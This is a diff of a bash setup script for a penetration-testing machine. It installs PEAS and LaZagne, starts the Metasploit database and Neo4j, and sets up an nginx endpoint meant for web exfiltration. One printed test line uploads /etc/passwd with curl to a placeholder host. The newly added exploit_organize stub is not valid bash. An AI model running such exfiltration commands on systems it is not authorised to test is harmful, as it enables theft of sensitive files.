@@ -53,7 +53,7 @@ error_handler(){
 
 
 
-function grab_peas {
+grab_peas() {
     linpeas_sh='https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh'
     winpeas_bat='https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat'
     winpeas_exe='https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe'
@@ -70,7 +70,7 @@ function grab_peas {
 }
 
 
-function jon {
+jon() {
     echo "Doing some work, here's a nice portrait, circa 2022 \n"
     echo "   -    \\\\O"
     echo "  -     /\\  "
@@ -80,7 +80,7 @@ function jon {
     echo "Ol' Jon, kickin' them rocks again \n"
 }
 
-function msfdb_init {
+msfdb_init() {
     # TODO: Check and make sure the msfdb is actually up and running (msfdb run)
     print_message "info" "Initializing MSF database"
     run_and_log sudo systemctl start postgresql
@@ -94,7 +94,7 @@ function msfdb_init {
     run_and_log sudo msfdb status
 }
 
-function neo4j_init {
+neo4j_init() {
     # TODO: Grab the port/service information and present to the user
     run_and_log sudo mkdir -p /usr/share/neo4j/logs
     run_and_log sudo touch /usr/share/neo4j/logs/neo4j.log
@@ -102,7 +102,7 @@ function neo4j_init {
     print_message "green" "Neo4j service initialized"
 }
 
-function nginx_config {
+nginx_config() {
     # Used to create an NGINX proxy for apache for web exfiltration 
     run_and_log sudo mkdir -p /var/www/uploads/Exfil
     run_and_log sudo chown -R www-data:www-data /var/www/uploads/Exfil
@@ -117,7 +117,26 @@ function nginx_config {
     print_message "good" "curl -T /etc/passwd http://<ip>:8443/Exfil/testfile.txt ; tail -n 1 /var/www/uploads/Exfil/testfile.txt"
 }
 
-function peas_download {
+exploit_organize() {
+    """This is meant to be the main (globa) function holder for the organization of exploits into their respective directories"""
+    #TODO: Pull out the directory creation functions and place them within here
+
+    function ad_org {
+
+    }
+
+    function linux_org {
+
+    }
+
+
+    function windows_org {
+
+    }
+
+}
+
+peas_download() {
     # For the time being - just scrub the PEAS directory and re-obtain
     if [[ -d "${dldir}/PEAS" ]]; then
         # Lol, risky
@@ -140,7 +159,7 @@ function peas_download {
 # Failure or error should be "bad". Will output with [!] in front
 # Other information should be "info". Will output with [+] in front
 # Extra debug-level detail should be "debug". Will output with DEBUG: in front
-function print_message {
+print_message() {
     # Print the provided message with pretty colors and a datetime stamp
     case $1 in
         good|green|success)
@@ -193,6 +212,7 @@ ff02::2 ip6-allrouters" > /etc/hosts
 # TODO: Come up with naming convention for shells & organize based off target architecture
 # TODO: Add platform and target architecture
 # TODO: Make msfvenom payload generation as submethods
+# TODO: Jam each step of this into the zenity library, providing a GUI with dropdown for choices at each step!
 shell_creation() {
   
   listen_port=6969
@@ -244,6 +264,7 @@ shh() {
   echo "Never gonna tell a lie and hurt you.                          "
   echo "                                                              "
 }
+
 
 silence_pcbeep () { # I stop the ridiculous terminal beeping !
     sudo echo -e "blacklist pcspkr" > /etc/modprobe.d/nobeep.conf
@@ -344,7 +365,7 @@ system_update() {
 }
 
 #Throw test cases into here, invoke with -test
-function test {
+test() {
     #zenity --info --title="Notification" --text="Hello!" --width=200 --height=100
     silence_pcbeep
     shell_creation
@@ -352,7 +373,7 @@ function test {
 
 tool_install() {
     cd "$dldir"
-    structure_setup
+    structure_setup # Decouple me from this function and put me into the organization function
     
     # Temp method to grab lazagne and the old firefox decrypt for python2
     lazagne_exe='https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe'
@@ -363,7 +384,7 @@ tool_install() {
     
     # End temp method
     
-    is_repo_installed() {
+    is_repo_installed() { #Never delete me, this is Kaedraar's wizardry
         if [[ "$1" =~ https://.+/(.+)\.git ]]; then
             if [[ -d "./${BASH_REMATCH[1]}" ]]; then
                 return 0
